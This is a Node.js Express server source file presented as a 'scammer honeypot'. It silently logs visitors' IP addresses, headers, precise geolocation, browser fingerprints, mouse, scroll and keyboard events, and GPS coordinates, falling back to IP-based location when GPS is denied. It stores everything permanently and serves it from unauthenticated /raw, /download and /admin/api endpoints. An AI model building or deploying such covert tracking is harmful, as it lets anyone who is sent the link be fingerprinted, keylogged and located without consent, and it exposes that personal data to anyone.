const express = require('express'); // Fixed typo in geolocation code
const fs = require('fs');
const path = require('path');
const http = require('http');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.static('.'));

// Log file path - DATA PERSISTS PERMANENTLY
// On Render: Data persists as long as service is running
// File is never cleared - all historical data is preserved
const LOG_FILE = 'scammer_data.json';

// Initialize log file if it doesn't exist
if (!fs.existsSync(LOG_FILE)) {
    fs.writeFileSync(LOG_FILE, JSON.stringify([], null, 2));
    console.log('📝 Created new data file - all future data will be permanently saved');
} else {
    const existingData = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));
    console.log(`📝 Loaded existing data file with ${existingData.length} entries - data persists permanently`);
}

// Helper function to get client IP
function getClientIP(req) {
    let ip = req.headers['x-forwarded-for'] || 
             req.headers['x-real-ip'] || 
             req.connection.remoteAddress || 
             req.socket.remoteAddress ||
             (req.connection.socket ? req.connection.socket.remoteAddress : null);
    
    // Handle comma-separated IPs (from proxy)
    if (ip && ip.includes(',')) {
        ip = ip.split(',')[0].trim();
    }
    
    // Remove IPv6 prefix if present
    if (ip && ip.startsWith('::ffff:')) {
        ip = ip.substring(7);
    }
    
    return ip;
}

// Helper function to get detailed geolocation from IP (tries multiple services)
function getGeolocation(ip) {
    return new Promise((resolve) => {
        // Skip if IP is localhost or invalid
        if (!ip || ip === '::1' || ip === '127.0.0.1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
            resolve(null);
            return;
        }
        
        // Try ip-api.com first (free, no API key, more detailed)
        const ipApiUrl = `http://ip-api.com/json/${ip}?fields=status,message,continent,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query`;
        
        const request = http.get(ipApiUrl, { timeout: 5000 }, (res) => {
            let data = '';
            
            // Check if response is OK
            if (res.statusCode !== 200) {
                console.log(`Geolocation API returned status ${res.statusCode}`);
                resolve(null);
                return;
            }
            
            res.on('data', (chunk) => {
                data += chunk;
            });
            
            res.on('end', () => {
                try {
                    // Check if data is empty
                    if (!data || data.trim() === '') {
                        console.log('Geolocation API returned empty response');
                        resolve(null);
                        return;
                    }
                    
                    const geo = JSON.parse(data);
                    if (geo && geo.status === 'success') {
                        // Build comprehensive location object
                        const location = {
                            // Country information
                            country: geo.country,
                            countryCode: geo.countryCode,
                            continent: geo.continent,
                            
                            // State/Province
                            region: geo.regionName,
                            regionCode: geo.region,
                            
                            // City/District
                            city: geo.city,
                            district: geo.district || null,
                            
                            // Postal code
                            zip: geo.zip,
                            postalCode: geo.zip,
                            
                            // Coordinates
                            latitude: geo.lat,
                            longitude: geo.lon,
                            
                            // Timezone
                            timezone: geo.timezone,
                            
                            // Currency
                            currency: geo.currency || null,
                            
                            // Network information (can contain location hints)
                            isp: geo.isp,
                            org: geo.org,
                            as: geo.as,
                            asname: geo.asname || null,
                            
                            // Reverse DNS (sometimes contains location)
                            reverse: geo.reverse || null,
                            
                            // Connection type
                            mobile: geo.mobile || false,
                            proxy: geo.proxy || false,
                            hosting: geo.hosting || false,
                            
                            // Additional parsed location info from ISP/Org names
                            locationHints: parseLocationFromISP(geo.isp, geo.org, geo.city)
                        };
                        
                        resolve(location);
                    } else {
                        resolve(null);
                    }
                } catch (error) {
                    console.log('Error parsing geolocation (non-critical):', error.message);
                    resolve(null);
                }
            });
        });
        
        // Handle timeout
        request.on('timeout', () => {
            request.destroy();
            console.log('Geolocation request timeout');
            resolve(null);
        });
        
        // Handle errors
        request.on('error', (error) => {
            console.log('Error fetching geolocation (non-critical):', error.message);
            resolve(null);
        });
    });
}

// Helper function to extract location hints from ISP/Organization names
function parseLocationFromISP(isp, org, city) {
    const hints = {
        districts: [],
        areas: [],
        localities: []
    };
    
    if (!isp && !org) return hints;
    
    const text = `${isp || ''} ${org || ''}`.toLowerCase();
    
    // Common Indian districts/areas that might appear in ISP names
    const indianDistricts = [
        'andheri', 'bandra', 'borivali', 'chembur', 'dadar', 'ghatkopar', 'goregaon', 'juhu', 'kandivali', 'kurla', 'malad', 'mulund', 'powai', 'thane', 'vashi',
        'connaught place', 'karol bagh', 'lajpat nagar', 'saket', 'dwarka', 'rohini', 'noida', 'gurgaon', 'faridabad',
        'mumbai', 'delhi', 'bangalore', 'hyderabad', 'chennai', 'kolkata', 'pune', 'ahmedabad', 'surat'
    ];
    
    // Check for district mentions
    indianDistricts.forEach(district => {
        if (text.includes(district)) {
            hints.districts.push(district);
        }
    });
    
    // Check for area codes or localities
    const areaCodeMatch = text.match(/\b\d{3,6}\b/);
    if (areaCodeMatch) {
        hints.areas.push(areaCodeMatch[0]);
    }
    
    return hints;
}

// Helper function to log data
function logData(data) {
    try {
        const existingData = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));
        existingData.push(data);
        fs.writeFileSync(LOG_FILE, JSON.stringify(existingData, null, 2));
        console.log('Data logged:', new Date().toISOString());
    } catch (error) {
        console.error('Error logging data:', error);
    }
}

// Routes
app.get('/', (req, res) => {
    const indexPath = path.join(__dirname, 'index.html');
    if (fs.existsSync(indexPath)) {
        res.sendFile(indexPath);
    } else {
        res.status(404).send('Page not found');
    }
});

// Admin panel
app.get('/admin', (req, res) => {
    try {
        const adminPath = path.join(__dirname, 'admin.html');
        if (fs.existsSync(adminPath)) {
            res.sendFile(adminPath);
        } else {
            console.error('Admin.html not found at:', adminPath);
            console.error('Current __dirname:', __dirname);
            res.status(404).send('Admin panel not found');
        }
    } catch (error) {
        console.error('Error serving admin panel:', error);
        res.status(500).send('Error loading admin panel');
    }
});

// Log visitor information (COMPREHENSIVE DATA COLLECTION)
app.post('/log-visitor', async (req, res) => {
    const ip = getClientIP(req);
    const visitorData = {
        ...req.body,
        ip: ip,
        headers: req.headers,
        timestamp: new Date().toISOString()
    };
    
    // Get geolocation data
    const geolocation = await getGeolocation(ip);
    if (geolocation) {
        visitorData.location = geolocation;
    }
    
    logData({
        type: 'visitor',
        data: visitorData
    });
    
    console.log('🎯 SCAMMER VISITED - COMPREHENSIVE DATA CAPTURED:');
    console.log('IP Address:', visitorData.ip);
    if (geolocation) {
        let locationStr = geolocation.city || '';
        if (geolocation.district) locationStr += `, ${geolocation.district}`;
        if (geolocation.region) locationStr += `, ${geolocation.region}`;
        if (geolocation.country) locationStr += `, ${geolocation.country}`;
        console.log('📍 Location:', locationStr);
        console.log('📍 Coordinates:', `${geolocation.latitude}, ${geolocation.longitude}`);
        console.log('📍 ISP:', geolocation.isp);
        if (geolocation.district) console.log('📍 District:', geolocation.district);
        if (geolocation.locationHints && geolocation.locationHints.districts.length > 0) {
            console.log('📍 Location Hints from ISP:', geolocation.locationHints.districts.join(', '));
        }
    }
    console.log('User Agent:', visitorData.userAgent);
    console.log('Device Type:', visitorData.deviceType);
    console.log('OS:', visitorData.osName);
    console.log('Browser:', visitorData.browserName, visitorData.browserVersion);
    console.log('Screen:', visitorData.screenWidth + 'x' + visitorData.screenHeight);
    console.log('Mobile:', visitorData.isMobile);
    console.log('Tablet:', visitorData.isTablet);
    console.log('Desktop:', visitorData.isDesktop);
    console.log('Language:', visitorData.language);
    console.log('Timezone:', visitorData.timezone);
    console.log('Referrer:', visitorData.referrer);
    console.log('Hardware Cores:', visitorData.hardwareConcurrency);
    console.log('Touch Points:', visitorData.maxTouchPoints);
    console.log('WebGL:', visitorData.webgl ? 'Available' : 'Not Available');
    console.log('Canvas Fingerprint:', visitorData.canvasFingerprint ? 'Captured' : 'Not Available');
    console.log('Plugins:', visitorData.plugins ? visitorData.plugins.length : 0);
    console.log('==========================================');
    
    res.json({ status: 'success' });
});

// Log user actions
app.post('/log-action', (req, res) => {
    const actionData = {
        ...req.body,
        ip: getClientIP(req),
        timestamp: new Date().toISOString()
    };
    
    logData({
        type: 'action',
        data: actionData
    });
    
    console.log('📱 USER ACTION:', actionData.action);
    
    res.json({ status: 'success' });
});

// Log interactions
app.post('/log-interaction', (req, res) => {
    const interactionData = {
        ...req.body,
        ip: getClientIP(req),
        timestamp: new Date().toISOString()
    };
    
    logData({
        type: 'interaction',
        data: interactionData
    });
    
    res.json({ status: 'success' });
});

// Log visibility changes
app.post('/log-visibility', (req, res) => {
    const visibilityData = {
        ...req.body,
        ip: getClientIP(req),
        timestamp: new Date().toISOString()
    };
    
    logData({
        type: 'visibility',
        data: visibilityData
    });
    
    res.json({ status: 'success' });
});

// Log scroll behavior
app.post('/log-scroll', (req, res) => {
    const scrollData = {
        ...req.body,
        ip: getClientIP(req),
        timestamp: new Date().toISOString()
    };
    
    logData({
        type: 'scroll',
        data: scrollData
    });
    
    res.json({ status: 'success' });
});

// Log mouse movements
app.post('/log-mouse', (req, res) => {
    const mouseData = {
        ...req.body,
        ip: getClientIP(req),
        timestamp: new Date().toISOString()
    };
    
    logData({
        type: 'mouse',
        data: mouseData
    });
    
    res.json({ status: 'success' });
});

// Log keyboard events
app.post('/log-keyboard', (req, res) => {
    const keyboardData = {
        ...req.body,
        ip: getClientIP(req),
        timestamp: new Date().toISOString()
    };
    
    logData({
        type: 'keyboard',
        data: keyboardData
    });
    
    res.json({ status: 'success' });
});

// Log page unload
app.post('/log-unload', (req, res) => {
    const unloadData = {
        ...req.body,
        ip: getClientIP(req),
        timestamp: new Date().toISOString()
    };
    
    logData({
        type: 'unload',
        data: unloadData
    });
    
    res.json({ status: 'success' });
});

// Log exact browser location (GPS coordinates)
app.post('/log-visitor-location', async (req, res) => {
    const ip = getClientIP(req);
    const locationData = {
        ...req.body,
        ip: ip,
        timestamp: new Date().toISOString()
    };
    
    try {
        const existingData = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));
        // Find the most recent visitor entry with this IP and update it
        for (let i = existingData.length - 1; i >= 0; i--) {
            if (existingData[i].type === 'visitor' && existingData[i].data.ip === ip) {
                // Update with exact location if available
                if (locationData.exactLocation && locationData.exactLocation.latitude) {
                    // User allowed GPS - add exact coordinates
                    existingData[i].data.exactLocation = locationData.exactLocation;
                    fs.writeFileSync(LOG_FILE, JSON.stringify(existingData, null, 2));
                    console.log('✅ EXACT GPS LOCATION CAPTURED:');
                    console.log(`📍 Exact Coordinates: ${locationData.exactLocation.latitude}, ${locationData.exactLocation.longitude}`);
                    console.log(`📍 Accuracy: ${locationData.exactLocation.accuracy}m`);
                } else if (locationData.exactLocation && locationData.exactLocation.denied) {
                    // User denied GPS - ensure IP-based backup location exists
                    existingData[i].data.exactLocation = {
                        denied: true,
                        error: 'User denied browser location permission'
                    };
                    
                    // If IP-based location wasn't captured yet, get it now as backup
                    if (!existingData[i].data.location) {
                        const backupLocation = await getGeolocation(ip);
                        if (backupLocation) {
                            existingData[i].data.location = backupLocation;
                            console.log('📍 BACKUP IP-BASED LOCATION CAPTURED (GPS denied):');
                            console.log(`📍 Location: ${backupLocation.city}, ${backupLocation.region}, ${backupLocation.country}`);
                            console.log(`📍 Coordinates: ${backupLocation.latitude}, ${backupLocation.longitude}`);
                        }
                    } else {
                        console.log('📍 IP-BASED LOCATION ALREADY CAPTURED (backup for denied GPS)');
                        if (existingData[i].data.location.city) {
                            console.log(`📍 Backup Location: ${existingData[i].data.location.city}, ${existingData[i].data.location.region}, ${existingData[i].data.location.country}`);
                        }
                    }
                    
                    fs.writeFileSync(LOG_FILE, JSON.stringify(existingData, null, 2));
                    console.log('❌ User denied browser GPS location - using IP-based backup');
                }
                break;
            }
        }
    } catch (error) {
        console.error('Error updating location:', error);
    }
    
    logData({
        type: 'location_update',
        data: locationData
    });
    
    res.json({ status: 'success' });
});

// API endpoint to get stats
app.get('/admin/api', (req, res) => {
    try {
        const data = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));
        
        // Create a comprehensive summary
        const summary = {
            totalVisitors: data.filter(item => item.type === 'visitor').length,
            totalActions: data.filter(item => item.type === 'action').length,
            totalInteractions: data.filter(item => item.type === 'interaction').length,
            totalScrolls: data.filter(item => item.type === 'scroll').length,
            totalMouseMovements: data.filter(item => item.type === 'mouse').length,
            totalKeyboardEvents: data.filter(item => item.type === 'keyboard').length,
            
            visitors: data.filter(item => item.type === 'visitor').map(item => ({
                timestamp: item.data.timestamp,
                ip: item.data.ip,
                location: item.data.location, // IP-based location (approximate)
                exactLocation: item.data.exactLocation, // Browser GPS (exact coordinates)
                userAgent: item.data.userAgent,
                deviceType: item.data.deviceType,
                osName: item.data.osName,
                browserName: item.data.browserName,
                browserVersion: item.data.browserVersion,
                screenWidth: item.data.screenWidth,
                screenHeight: item.data.screenHeight,
                isMobile: item.data.isMobile,
                isTablet: item.data.isTablet,
                isDesktop: item.data.isDesktop,
                language: item.data.language,
                timezone: item.data.timezone,
                referrer: item.data.referrer,
                hardwareConcurrency: item.data.hardwareConcurrency,
                maxTouchPoints: item.data.maxTouchPoints,
                webgl: item.data.webgl,
                canvasFingerprint: item.data.canvasFingerprint,
                plugins: item.data.plugins
            })),
            
            actions: data.filter(item => item.type === 'action').map(item => ({
                action: item.data.action,
                timestamp: item.data.timestamp,
                ip: item.data.ip
            }))
        };
        
        res.json(summary);
    } catch (error) {
        res.status(500).json({ error: 'Failed to read data' });
    }
});

// Download captured data
app.get('/download', (req, res) => {
    res.download(LOG_FILE, 'scammer_data.json');
});

// Raw data view
app.get('/raw', (req, res) => {
    try {
        const data = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));
        res.json(data);
    } catch (error) {
        res.status(500).json({ error: 'Failed to read data' });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 PASSIVE SCAMMER HONEYPOT SERVER RUNNING ON PORT ${PORT}`);
    console.log(`🎯 Send scammers to: http://localhost:${PORT}`);
    console.log(`🔒 Admin panel: http://localhost:${PORT}/admin`);
    console.log(`📊 API data: http://localhost:${PORT}/admin/api`);
    console.log(`📥 Download data: http://localhost:${PORT}/download`);
    console.log(`📱 NO USER ACTION REQUIRED - JUST CLICK THE LINK!`);
});
